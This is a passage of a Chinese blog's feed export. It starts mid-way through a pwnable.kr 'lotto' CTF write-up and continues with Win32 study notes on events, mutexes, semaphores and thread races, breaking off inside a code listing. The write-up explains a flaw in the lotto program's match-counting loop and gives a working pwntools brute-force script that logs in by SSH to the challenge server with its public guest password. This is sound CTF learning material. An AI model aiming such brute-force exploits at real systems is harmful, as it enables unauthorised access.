class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// menu</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- Select Menu -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1. Play Lotto\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2. Help\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(menu)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">play();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">help();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;invalid menu\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在本地运行程序了解过程，感觉相当于一个猜数游戏，分析程序代码</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130221629615.png"></p><h4 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// generate lotto numbers</span></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;<span class="comment">// 1 ~ 45</span></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br></pre></td></tr></table></figure><p>上面代码意思为生成6个小于等于45的随机数，刚开始我一个urandom和random是一样的伪随机数，但我用c语言写了一个简单的程序后发现并不一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> lotto[<span class="number">6</span>];</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">        read(fd, lotto, <span class="number">6</span>);</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d, &quot;</span>,lotto[i] % <span class="number">45</span> + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成 a.out文件后运行结果</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130222234571.png"></p><p>所以这道题并不能使用伪随机的特性来做</p><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>继续分析下面的检测函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">match++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码很有意思，我看第一遍时没想那么多，只是想到了输入的6个字节的顺序不一定要和lotto数组中的数据顺序相同，但是在后面发现这里面存在一个点就是，这没考虑我们输入的6个字节全是一样的情况，可以利用爆破</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>这里注意一点细节是我们输入的字节大小需要小于等于45才可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;######&#x27;</span></span><br><span class="line">sh = ssh(<span class="string">&#x27;lotto&#x27;</span>, <span class="string">&#x27;pwnable.kr&#x27;</span>, password = <span class="string">&#x27;guest&#x27;</span>, port = <span class="number">2222</span>)</span><br><span class="line">p = sh.process(<span class="string">&#x27;./lotto&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Submit your 6 lotto bytes : &#x27;</span>,payload)</span><br><span class="line">    msg = p.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;bad luck&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> msg:</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">        log.success(msg)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p.close()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130223218226.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210130221133246.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;利用scp命令从服务器下载源码到本地&lt;/p</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>🎦Win32学习记录4(事件 互斥体 信号量)</title>
    <link href="http://example.com/2020/11/12/windows/Win32-4/"/>
    <id>http://example.com/2020/11/12/windows/Win32-4/</id>
    <published>2020-11-12T14:00:20.492Z</published>
    <updated>2021-02-05T06:30:13.868Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><h4 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h4><ul><li>通知状态</li></ul><p>​        表示操作系统可以调用</p><ul><li><p>未通知状态</p><p>操作系统不可以调用</p><h4 id="WaitForSingleObject函数"><a href="#WaitForSingleObject函数" class="headerlink" title="WaitForSingleObject函数"></a><strong>WaitForSingleObject</strong>函数</h4></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>hHandle</strong></p><p>对象的句柄。</p></li><li><p><strong>dwMilliseconds</strong></p><p>超时间隔（以毫秒为单位）。如果指定了非零值，则函数将等待，直到发出信号通知对象或间隔过去为止。如果<em>dwMilliseconds</em>为零，则如果未用信号通知对象，则函数不会进入等待状态；否则，函数将进入等待状态。它总是立即返回。如果<em>dwMilliseconds</em>为<strong>INFINITE</strong>，则该函数仅在信号通知对象时返回。</p></li></ul><h4 id="WaitForMultipleObjects函数"><a href="#WaitForMultipleObjects函数" class="headerlink" title="WaitForMultipleObjects函数"></a>WaitForMultipleObjects函数</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForMultipleObjects</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD        nCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> HANDLE lpHandles,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL         bWaitAll,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD        dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>nCount</strong></p><p><em>lpHandles</em>指向的数组中对象句柄的数量。对象句柄的最大数量为<strong>MAXIMUM_WAIT_OBJECTS</strong>。此参数不能为零。</p></li><li><p><strong>lpHandles</strong></p><p>对象句柄数组。</p></li><li><p><strong>bWaitAll</strong></p><p>如果此参数为<strong>TRUE</strong>，则当信号<em>lpHandles</em>数组中所有对象的状态时，该函数将返回。如果为<strong>FALSE</strong>，则当任何一个对象的状态设置为已信号通知时，该函数将返回。在后一种情况下，返回值指示其状态导致函数返回的对象。</p></li><li><p><strong>dwMilliseconds</strong></p><p>超时间隔（以毫秒为单位）。如果指定了非零值，则函数将等待，直到发出指定对象的信号或间隔过去为止。如果<em>dwMilliseconds</em>为零，则如果未发出指定对象的信号，则函数不会进入等待状态；否则，函数将进入等待状态。它总是立即返回。如果<em>dwMilliseconds</em>为<strong>INFINITE</strong>，则该函数仅在发出指定对象的信号时返回。</p></li></ul><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><h4 id="事件对象的创建"><a href="#事件对象的创建" class="headerlink" title="事件对象的创建"></a>事件对象的创建</h4><ul><li><p>函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateEventA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bManualReset,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bInitialState,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><ul><li><p><strong>lpEventAttributes</strong></p><p>内核对象都拥有该参数，一般情况下设置<strong>NULL</strong></p></li><li><p><strong>bManualReset</strong></p><p>布尔类型</p><ul><li><p>TRUE</p><p>创建一个手动重置的时间对象，重置需要用到ResetEvent函数将事件状态设置为非信号状态(未通知状态)</p></li><li><p>FALS</p><p>创建一个自动重置事件对象,在释放单个等待线程后，系统自动将事件状态重置为未通知状态</p><p>{简单来说}</p></li></ul></li><li><p><strong>bInitialState</strong></p><p>如果此参数为<strong>TRUE</strong>，则表示事件对象的初始状态；</p><p><strong>否则</strong>，将显示事件对象的初始状态。否则，它是无信号的。</p></li><li><p><strong>lpName</strong></p><p>事件名称</p></li></ul></li></ul><h4 id="事件对象的控制"><a href="#事件对象的控制" class="headerlink" title="事件对象的控制"></a>事件对象的控制</h4><h5 id="SetEvnet"><a href="#SetEvnet" class="headerlink" title="SetEvnet()"></a>SetEvnet()</h5><ul><li><p>函数定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hEvent</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>将事件设置为已通知状态</p></li></ul><h5 id="ResetEvent"><a href="#ResetEvent" class="headerlink" title="ResetEvent"></a>ResetEvent</h5><ul><li><p>函数定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ResetEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hEvent</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>将事件设置为未通知状态</p></li></ul><h4 id="事件同步–消费者与生产者"><a href="#事件同步–消费者与生产者" class="headerlink" title="事件同步–消费者与生产者"></a>事件同步–消费者与生产者</h4><p>​        事件的同步解释为将线程按照规定的顺序进行，线程被创建出来是被随机分配的CPU的，那个CPU空闲就分配给哪个线程(说得不是很专业，具体参照微软官方定义)，所以事件的同步可以理解为人为的控制线程运行的顺序</p><p>​        下面为用事件进行线程同步的思路</p><ul><li><p>创建两个事件，事件A和事件B，一个事件初始化为通知状态，另一个初始化为已通知状态，且两个事件都设置为手动更改状态</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a_Event = CreateEvent(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line">b_Event = CreateEvent(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li><li><p>创建线程1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"> &#123;</span><br><span class="line"> WaitForSingleObject(a_Event,INFINITE);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;This is a Producer Create A+++++\n&quot;</span>);</span><br><span class="line"> Sleep(<span class="number">500</span>);</span><br><span class="line"> SetEvent(b_Event);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在线程1中将事件B设置为已通知状态</p></li><li><p>创建线程2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(b_Event,INFINITE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This is a Consumer Destroy A-----\n&quot;</span>);</span><br><span class="line">Sleep(<span class="number">500</span>);</span><br><span class="line">SetEvent(a_Event);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在结束时将线程1设置为已通知状态</p></li></ul><p>这样就可以使两个线程交替进行，且充分利用了CPU</p><h3 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h3><h4 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateMutexA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpMutexAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bInitialOwner,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>dwDesiredAccess</strong></p><p>互斥体属于内核对象，一般情况下设置为NULL</p></li><li><p><strong>bInheritHandle</strong></p><p>如果此值为<strong>TRUE</strong>，并且调用方创建了互斥量，则调用线程将获得该互斥对象的初始所有权。否则，调用线程将无法获得该互斥锁的所有权。</p></li><li><p>lpName</p><p>创建的互斥体的名称，如果在一个进程中使用可以为NULL，如果在不同进程中使用需要赋予名称</p></li></ul><h4 id="在其他进程中打开互斥体"><a href="#在其他进程中打开互斥体" class="headerlink" title="在其他进程中打开互斥体"></a>在其他进程中打开互斥体</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenMutexW</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL    bInheritHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>dwDesiredAccess</strong></p><p>互斥体属于内核对象，一般情况下设置为NULL</p></li><li><p><strong>bInheritHandle</strong></p><p>如果此值为<strong>TRUE</strong>，则此进程创建的进程将继承该句柄。否则，进程将不会继承此句柄</p></li><li><p><strong>lpName</strong></p><p>需要打开的互斥体的名称</p></li></ul><h4 id="释放指定互斥对象的所有权"><a href="#释放指定互斥对象的所有权" class="headerlink" title="释放指定互斥对象的所有权"></a>释放指定互斥对象的所有权</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ReleaseMutex</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hMutex</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>hMutex</strong></p><p>互斥对象的句柄。该 <strong>CreateMutex</strong>或<strong>OpenMutex</strong>函数返回此句柄。</p></li></ul><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><h4 id="创建信号量"><a href="#创建信号量" class="headerlink" title="创建信号量"></a>创建信号量</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateSemaphoreW</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG                  lInitialCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG                  lMaximumCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR               lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>lpSemaphoreAttributes</strong></p><p>互斥体属于内核对象，一般情况下设置为NULL</p></li><li><p><strong>lInitialCount</strong></p><p>信号量对象的初始计数。此值必须大于或等于零且小于或等于<em>lMaximumCount</em>。当信号量的计数大于零时，将发出信号状态；在信号量为零时，将不发出信号状态。每当等待函数释放等待信号量的线程时，计数就会减少一。通过调用ReleaseSemaphore函数将计数增加指定的数量 。</p></li><li><p><strong>lMaximumCount</strong></p><p>信号量对象的最大计数。该值必须大于零。</p></li><li><p><strong>lpName</strong></p><p>创建的信号量名称，可以NULL</p></li></ul><h4 id="释放等待信号量"><a href="#释放等待信号量" class="headerlink" title="释放等待信号量"></a>释放等待信号量</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ReleaseSemaphore</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hSemaphore,</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG   lReleaseCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPLONG lpPreviousCount</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>hSemaphore</strong></p><p>信号量对象的句柄。该 CreateSemaphore或 OpenSemaphore函数返回该句柄。</p></li><li><p><strong>lReleaseCount</strong></p><p>信号量对象的当前计数要增加的数量。该值必须大于零。如果指定的数量将导致信号量的计数超过创建信号量时指定的最大计数，则该计数不会更改，函数将返回<strong>FALSE</strong>。</p></li><li><p><strong>lpPreviousCount</strong></p><p>指向变量的指针，以接收信号量的先前计数。如果不需要上一个计数，则此参数可以为<strong>NULL</strong>。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;对象&quot;&gt;&lt;a href=&quot;#对象&quot; class=&quot;headerlink&quot; title=&quot;对象&quot;&gt;&lt;/a&gt;对象&lt;/h3&gt;&lt;h4 id=&quot;状态&quot;&gt;&lt;a href=&quot;#状态&quot; class=&quot;headerlink&quot; title=&quot;状态</summary>
      
    
    
    
    <category term="Windows" scheme="http://example.com/categories/Windows/"/>
    
    <category term="win32" scheme="http://example.com/categories/Windows/win32/"/>
    
    <category term="线程" scheme="http://example.com/categories/Windows/win32/%E7%BA%BF%E7%A8%8B/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>🎦Win32学习记录-3(线程控制与临界区)</title>
    <link href="http://example.com/2020/11/05/windows/Win32-3/"/>
    <id>http://example.com/2020/11/05/windows/Win32-3/</id>
    <published>2020-11-05T13:20:56.052Z</published>
    <updated>2021-02-05T06:29:50.382Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="多线程之间的资源抢占问题"><a href="#多线程之间的资源抢占问题" class="headerlink" title="多线程之间的资源抢占问题"></a>多线程之间的资源抢占问题</h3><p>​        当多个线程使用同一个资源时，会出现资源抢占问题</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201103194832013.png" style="zoom:80%;" /><p>​        这个程序功能为向文本框中加数字，每一次加一，两个线程同时加，每一个线程最多加到1000，当两个线程结束后，文本框中的期望值为2000。但是当同时按下两个按钮等待线程结束后，文本框中的结果却与期望值有偏差</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201103195026242.png" style="zoom:80%;" /><ul><li><p>线程函数1 代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line">DWORD dwCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (dwIndex &lt; <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">GetWindowText(hEDIT, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwCount);</span><br><span class="line">dwCount++;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, dwCount);</span><br><span class="line">SetWindowText(hEDIT, szBuffer);</span><br><span class="line">dwIndex++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>线程函数2 代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">DWORD dwIndex = <span 